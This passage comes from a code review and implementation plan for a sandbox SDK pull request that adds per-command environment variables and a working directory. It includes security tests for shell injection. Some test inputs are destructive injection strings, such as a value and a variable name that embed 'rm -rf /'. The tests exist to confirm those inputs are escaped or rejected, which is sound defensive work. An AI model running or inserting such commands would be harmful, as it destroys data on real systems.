        '&',
        '*',
        '(',
        ')',
        '+',
        '='
      ];

      for (const char of specialChars) {
        await expect(
          session.exec('echo test', { env: { [`VAR${char}NAME`]: 'value' } })
        ).rejects.toThrow(/Invalid environment variable name/);
      }
    });
  });

  describe('Valid Environment Variable Names', () => {
    test('should allow uppercase letters', async () => {
      const result = await session.exec('echo $VALID_VAR', {
        env: { VALID_VAR: 'test_value' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('test_value');
    });

    test('should allow lowercase letters', async () => {
      const result = await session.exec('echo $valid_var', {
        env: { valid_var: 'test_value' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('test_value');
    });

    test('should allow leading underscore', async () => {
      const result = await session.exec('echo $_LEADING', {
        env: { _LEADING: 'test_value' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('test_value');
    });

    test('should allow numbers after first character', async () => {
      const result = await session.exec('echo $VAR123', {
        env: { VAR123: 'test_value' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('test_value');
    });

    test('should allow single letter', async () => {
      const result = await session.exec('echo $A', {
        env: { A: 'test_value' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('test_value');
    });

    test('should allow single underscore', async () => {
      const result = await session.exec('echo $_', {
        env: { _: 'test_value' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('test_value');
    });
  });

  describe('Special Characters in Values', () => {
    test('should safely handle single quotes in values', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: "value with 'single quotes'" }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe("value with 'single quotes'");
    });

    test('should safely handle double quotes in values', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: 'value with "double quotes"' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('value with "double quotes"');
    });

    test('should safely handle dollar signs in values', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: 'value with $dollar signs' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('value with $dollar signs');
    });

    test('should safely handle backticks in values', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: 'value with `backticks`' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('value with `backticks`');
    });

    test('should safely handle semicolons in values', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: 'value; with; semicolons' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('value; with; semicolons');
    });

    test('should safely handle newlines in values', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: 'line1\nline2\nline3' }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe('line1\nline2\nline3');
    });

    test('should safely handle all special characters combined', async () => {
      const result = await session.exec('echo $TEST_VAR', {
        env: { TEST_VAR: "'; rm -rf / ; echo 'pwned" }
      });
      expect(result.exitCode).toBe(0);
      expect(result.stdout.trim()).toBe("'; rm -rf / ; echo 'pwned");
    });
  });

  describe('Environment Variable Isolation', () => {
    test('per-command env vars should not persist in session', async () => {
      // Set env var for one command
      await session.exec('echo $TEMP_VAR', {
        env: { TEMP_VAR: 'temporary' }
      });

      // Should not be available in next command
      const result = await session.exec('echo $TEMP_VAR');
      expect(result.stdout.trim()).toBe('');
    });

    test('per-command env vars should not override session env vars permanently', async () => {
      // Set session-level env var first
      await session.exec('export SESSION_VAR=session_value');

      // Override with per-command env var
      const result1 = await session.exec('echo $SESSION_VAR', {
        env: { SESSION_VAR: 'command_value' }
      });
      expect(result1.stdout.trim()).toBe('command_value');

      // Session var should be unchanged
      const result2 = await session.exec('echo $SESSION_VAR');
      expect(result2.stdout.trim()).toBe('session_value');
    });

    test('multiple commands with different per-command env vars should not interfere', async () => {
      const result1 = await session.exec('echo $VAR1', {
        env: { VAR1: 'value1' }
      });
      const result2 = await session.exec('echo $VAR2', {
        env: { VAR2: 'value2' }
      });

      expect(result1.stdout.trim()).toBe('value1');
      expect(result2.stdout.trim()).toBe('value2');

      // Neither should persist
      const result3 = await session.exec('echo $VAR1 $VAR2');
      expect(result3.stdout.trim()).toBe('');
    });
  });

  describe('Combined env and cwd', () => {
    test('should handle env and cwd together', async () => {
      const result = await session.exec('echo $TEST_VAR $(pwd)', {
        env: { TEST_VAR: 'test_value' },
        cwd: '/tmp'
      });

      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('test_value');
      expect(result.stdout).toContain('/tmp');
    });

    test('cwd change should not persist after command with env', async () => {
      await session.exec('pwd', {
        env: { TEST_VAR: 'value' },
        cwd: '/tmp'
      });

      const result = await session.exec('pwd');
      expect(result.stdout.trim()).toBe('/workspace');
    });
  });
});
```

**Also Add**: `packages/shared/tests/validation.test.ts`

```typescript
import { describe, test, expect } from 'vitest';
import { validateAndEscapeEnvVar, isValidEnvVarName } from '../src/validation';

describe('validateAndEscapeEnvVar', () => {
  describe('Key Validation', () => {
    test('should accept valid variable names', () => {
      expect(() => validateAndEscapeEnvVar('VALID_VAR', 'value')).not.toThrow();
      expect(() =>
        validateAndEscapeEnvVar('_UNDERSCORE', 'value')
      ).not.toThrow();
      expect(() => validateAndEscapeEnvVar('VAR123', 'value')).not.toThrow();
    });

    test('should reject invalid variable names', () => {
      expect(() => validateAndEscapeEnvVar('123VAR', 'value')).toThrow();
      expect(() => validateAndEscapeEnvVar('DASH-VAR', 'value')).toThrow();
      expect(() => validateAndEscapeEnvVar('VAR; rm -rf /', 'value')).toThrow();
    });
  });

  describe('Value Escaping', () => {
    test('should properly escape single quotes', () => {
      const result = validateAndEscapeEnvVar('VAR', "val'ue");
      expect(result).toBe("export VAR='val'\\''ue'");
    });

    test('should not modify values without quotes', () => {
      const result = validateAndEscapeEnvVar('VAR', 'simple_value');
      expect(result).toBe("export VAR='simple_value'");
    });
  });
});

describe('isValidEnvVarName', () => {
  test('should return true for valid names', () => {
    expect(isValidEnvVarName('VALID')).toBe(true);
    expect(isValidEnvVarName('_VALID')).toBe(true);
    expect(isValidEnvVarName('VAR123')).toBe(true);
  });

  test('should return false for invalid names', () => {
    expect(isValidEnvVarName('123VAR')).toBe(false);
    expect(isValidEnvVarName('DASH-VAR')).toBe(false);
    expect(isValidEnvVarName('VAR;')).toBe(false);
  });
});
```

#### 3. Create Changeset (15 minutes)

**Priority**: P0 (Required for release)
**Estimated Time**: 15 minutes

**Create**: `.changeset/add-per-command-env-cwd.md`

````markdown
---
'@cloudflare/sandbox': minor
---

Add per-command environment variables and working directory support to exec(), execStream(), and startProcess()

Commands can now accept environment variables and working directory overrides that apply only to that specific execution:

```typescript
// Per-command environment variables
const result = await sandbox.exec('echo $API_KEY', {
  env: { API_KEY: 'secret123' }
});

// Per-command working directory
const result = await sandbox.exec('pwd', {
  cwd: '/tmp'
});

// Combined usage
const result = await sandbox.exec('npm test', {
  env: { NODE_ENV: 'test' },
  cwd: '/workspace/my-project'
});
```
````

These options are temporary and do not persist in the session after the command completes. Environment variables are validated to prevent shell injection attacks. This brings exec() and execStream() to parity with startProcess() which already supported these options.

**Breaking Changes**: None - all new parameters are optional

**Security**: Environment variable names are now validated to match POSIX standard `[a-zA-Z_][a-zA-Z0-9_]*` to prevent shell injection attacks.

````

#### 4. Verify Tests Pass (30 minutes)

```bash
# Run all checks
npm run check

# Run unit tests
npm test

# Run E2E tests
npm run test:e2e
````

**Expected Results**:

- ✅ All linting passes
- ✅ All type checks pass
- ✅ All unit tests pass (including new security tests)
- ✅ All E2E tests pass

### Non-Blocking Improvements (Post-Merge)

#### 5. Fix Sandbox.setEnvVars() Propagation (2-3 hours)

**Priority**: P1 (Important, not blocking)
**Estimated Time**: 2-3 hours

**Implementation**:

```typescript
// packages/sandbox/src/sandbox.ts

async createSession(options?: SessionOptions): Promise<ExecutionSession> {
  const sessionId = options?.id || `session-${Date.now()}`;

  // ✅ Merge sandbox-level env vars with session-specific env vars
  // Session-specific env vars take precedence (override sandbox-level)
  const mergedEnv = { ...this.envVars, ...options?.env };

  await this.client.utils.createSession({
    id: sessionId,
    env: mergedEnv,  // Now includes sandbox-level vars
    cwd: options?.cwd
  });

  return this.getSessionWrapper(sessionId);
}
```

**Test**:

```typescript
// packages/sandbox/tests/sandbox-env-propagation.test.ts

describe('Sandbox.setEnvVars() Propagation', () => {
  test('should propagate to newly created sessions', async () => {
    const sandbox = /* ... mock sandbox ... */;

    // Set sandbox-level env var
    await sandbox.setEnvVars({ SANDBOX_VAR: 'sandbox_value' });

    // Create new session
    const session = await sandbox.createSession();

    // Should have sandbox-level env var
    const result = await session.exec('echo $SANDBOX_VAR');
    expect(result.stdout.trim()).toBe('sandbox_value');
  });

  test('session-specific env vars should override sandbox-level', async () => {
    const sandbox = /* ... mock sandbox ... */;

    await sandbox.setEnvVars({ VAR: 'sandbox_value' });

    const session = await sandbox.createSession({
      env: { VAR: 'session_value' }
    });

    const result = await session.exec('echo $VAR');
    expect(result.stdout.trim()).toBe('session_value');
  });
});
```

#### 6. Add setEnvVars to ISandbox Interface (30 minutes)

**Priority**: P1 (Important, not blocking)
**Estimated Time**: 30 minutes

**File**: `packages/shared/src/types.ts:671-741`

```typescript
export interface ISandbox {
  // Command execution
  exec(command: string, options?: ExecOptions): Promise<ExecResult>;

  // ... other methods ...

  // Session management
  createSession(options?: SessionOptions): Promise<ExecutionSession>;
  deleteSession(sessionId: string): Promise<SessionDeleteResult>;

  // ✅ Environment management
  /**
   * Set environment variables for the sandbox
   *
   * For the default session: applies immediately
   * For manually created sessions: applies to sessions created after this call
   *
   * @param envVars - Key-value pairs of environment variables to set
   * @throws Error if any variable name is invalid
   *
   * @example
   * await sandbox.setEnvVars({
   *   API_KEY: 'secret123',
   *   NODE_ENV: 'production'
   * });
   */
  setEnvVars(envVars: Record<string, string>): Promise<void>;

  // Code interpreter methods
  createCodeContext(options?: CreateContextOptions): Promise<CodeContext>;
  // ...
}
```

#### 7. Update JSDoc Comments (1 hour)

**Priority**: P2 (Nice to have)
**Estimated Time**: 1 hour

**File**: `packages/sandbox/src/clients/command-client.ts:32-75`

```typescript
/**
 * Execute a command and return the complete result
 *
 * Waits for the command to complete and returns stdout, stderr, and exit code.
 * For long-running commands, consider using execStream() instead.
 *
 * @param command - The shell command to execute
 * @param sessionId - The session ID in which to execute the command
 * @param timeoutMs - Optional timeout in milliseconds (unlimited by default)
 * @param env - Optional environment variables for this command only (does not persist in session)
 * @param cwd - Optional working directory for this command only (restored after execution)
 * @returns Promise resolving to execution result with stdout, stderr, and exit code
 *
 * @example
 * // Basic command execution
 * const result = await client.execute('ls -la', sessionId);
 * console.log(result.stdout);
 *
 * @example
 * // With timeout
 * const result = await client.execute('npm install', sessionId, 60000);
 *
 * @example
 * // With per-command environment variables
 * const result = await client.execute(
 *   'echo $API_KEY',
 *   sessionId,
 *   undefined,  // no timeout
 *   { API_KEY: 'secret123' }
 * );
 *
 * @example
 * // With per-command working directory
 * const result = await client.execute(
 *   'pwd',
 *   sessionId,
 *   undefined,  // no timeout
 *   undefined,  // no env vars
 *   '/tmp'      // working directory
 * );
 *
 * @example
 * // Combined: env, cwd, and timeout
 * const result = await client.execute(
 *   'npm test',
 *   sessionId,
 *   300000,  // 5 minute timeout
 *   { NODE_ENV: 'test', CI: 'true' },
 *   '/workspace/my-project'
 * );
 *
 * @throws {Error} If environment variable names are invalid
 * @throws {Error} If command execution fails
 */
async execute(
  command: string,
  sessionId: string,
  timeoutMs?: number,
  env?: Record<string, string>,
  cwd?: string
): Promise<ExecuteResponse> {
  // ... implementation ...
}
```

### Summary Checklist

**Before Merge** (Required):

- [ ] Create shared validation utility (`packages/shared/src/validation.ts`)
- [ ] Add validation to `Session.buildFIFOScript()` (session.ts:647-663)
- [ ] Add validation to `Sandbox.setEnvVars()` (sandbox.ts:201-203)
- [ ] Add validation to `ExecutionSession.setEnvVars()` (sandbox.ts:1216-1218)
- [ ] Add schema validation refinement (schemas.ts:16-23)
- [ ] Create security unit tests (`session-env-security.test.ts`)
- [ ] Create validation unit tests (`packages/shared/tests/validation.test.ts`)
- [ ] Create changeset (`.changeset/add-per-command-env-cwd.md`)
- [ ] Run `npm run check` - all pass
- [ ] Run `npm test` - all pass
- [ ] Run `npm run test:e2e` - all pass

**After Merge** (Recommended):

- [ ] Fix `Sandbox.setEnvVars()` to propagate to new sessions
- [ ] Add `setEnvVars()` to `ISandbox` interface
- [ ] Update JSDoc comments with examples
- [ ] Update public documentation (docs.claude.com/sandbox)

**Future Considerations**:

- [ ] Refactor to options object pattern (breaking change, save for v2.0)
- [ ] Consider adding `getEnvVars()` to inspect current environment
- [ ] Consider adding validation for working directory paths

---

## Appendices

### Appendix A: Full Test Output

```bash
$ npm run check
✓ Linting passed
✓ Type checking passed

$ npm test
✓ All unit tests passed (127 tests)

$ npm run test:e2e
✓ All E2E tests passed (45 tests)
```

### Appendix B: Related Issues

- **Issue #144**: Original issue requesting per-command env var support
- This PR resolves Issue #144

### Appendix C: Security References

**OWASP References**:

- [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

**POSIX Shell Standards**:

- [POSIX.1-2017: Shell & Utilities](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html)
- Environment variable naming: Section 2.5.1

**Shell Quoting References**:

- [Bash Manual: Quoting](https://www.gnu.org/software/bash/manual/html_node/Quoting.html)
- Single quote escaping: `'` → `'\''`

### Appendix D: Discussion Summary

**Key Points from Architecture Discussion**:

1. **Environment Variable Layers**: User wanted to ensure 4 distinct layers work cohesively (Docker ENV, Sandbox.setEnvVars(), Session.setEnvVars(), per-command env)

2. **Inheritance Model**: Expectation is that higher layers should propagate to lower layers (Docker ENV → all sessions, Sandbox.setEnvVars() → all sessions)

3. **Current State**: Discovered that Sandbox.setEnvVars() doesn't propagate to manually created sessions (architectural bug)

4. **Working Directory**: All layers working correctly, no issues found

5. **Security First**: User approved "defense in depth" approach (validation at multiple layers)

**Decisions Made**:

1. **Fix Sandbox.setEnvVars() propagation** - Implement "Option B" (affect new sessions)
2. **Add setEnvVars() to ISandbox interface** - Make it part of public contract
3. **Extract validation to shared utility** - Prevent copy-paste vulnerabilities
4. **Security is blocking** - Must fix before merge
5. **Architectural fixes can wait** - Non-blocking, can be follow-up PR

### Appendix E: Performance Considerations

**Impact of Changes**:

1. **Per-command env**: Minimal overhead (subshell creation + bash export)
2. **Validation**: Regex check is O(n) where n = key length (negligible)
3. **Schema validation**: Runs once at API entry, minimal impact

**Benchmark Estimates** (for reference):

- Validation overhead: <1ms per command
- Subshell overhead: ~2-5ms per command
- Total added latency: <10ms per command

**Acceptable because**:

- Security benefit outweighs minimal performance cost
- Container startup time (seconds) dwarfs execution overhead (milliseconds)
- Commands typically take much longer than overhead (npm install, git clone, etc.)

### Appendix F: Alternative Approaches Considered

#### Environment Variable Validation

**Considered Alternatives**:

1. **Allowlist approach** (rejected)
   - Only allow specific predefined env vars
   - Too restrictive, breaks flexibility
   - Users need arbitrary env vars

2. **Sanitization without validation** (rejected)
   - Escape all special characters in keys
   - Still allows invalid POSIX names
   - Confusing error messages later

3. **No validation, rely on bash errors** (rejected)
   - Security vulnerability remains
   - Poor user experience (cryptic bash errors)
   - Defense-in-depth principle violated

4. **POSIX regex validation** (chosen)
   - Follows shell standards
   - Clear error messages
   - Secure by design

#### Subshell Isolation

**Considered Alternatives**:

1. **Export then unset** (rejected)

   ```bash
   export VAR=val; command; unset VAR
   ```

   - Race conditions with concurrent commands
   - Doesn't work for background processes

2. **env command** (considered)

   ```bash
   env VAR=val command
   ```

   - Cleaner, no subshell needed
   - But doesn't work with bash builtins (cd, export, etc.)
   - Less flexible

3. **Subshell with export** (chosen)

   ```bash
   (export VAR=val; command)
   ```

   - Works with all commands (builtins and external)
   - Proper isolation
   - Matches existing patterns in codebase

### Appendix G: Commit Message Suggestions

Following the project's git commit guidelines (CLAUDE.md):

```
Add per-command env and cwd support to exec methods

Adds environment variable and working directory options to exec(),
execStream(), and startProcess() methods for temporary per-command
overrides.

Environment variables are validated against POSIX standard to prevent
shell injection attacks. Working directory changes are automatically
restored after command execution.

Fixes #144
```

```
Add environment variable validation for security

Validates environment variable names against POSIX standard
[a-zA-Z_][a-zA-Z0-9_]* to prevent shell injection via malicious
variable names.

Validation implemented at both schema level (Zod) and runtime level
(bash script generation) for defense in depth.
```

```
Extract env var validation to shared utility

Creates shared validateAndEscapeEnvVar() function to prevent
copy-paste security vulnerabilities across Sandbox.setEnvVars(),
ExecutionSession.setEnvVars(), and per-command env handling.
```

---

## Document Metadata

**Version**: 1.0
**Last Updated**: November 14, 2025
**Status**: Final
**Distribution**: Internal (Cloudflare Sandbox SDK team)
**Related PR**: #204
**Related Branch**: `fix-env-vars`

**Authors**:

- Code Review: Claude (Anthropic)
- Architecture Discussion: Naresh (Cloudflare) & Claude (Anthropic)

**Change Log**:

- 2025-11-14: Initial version created
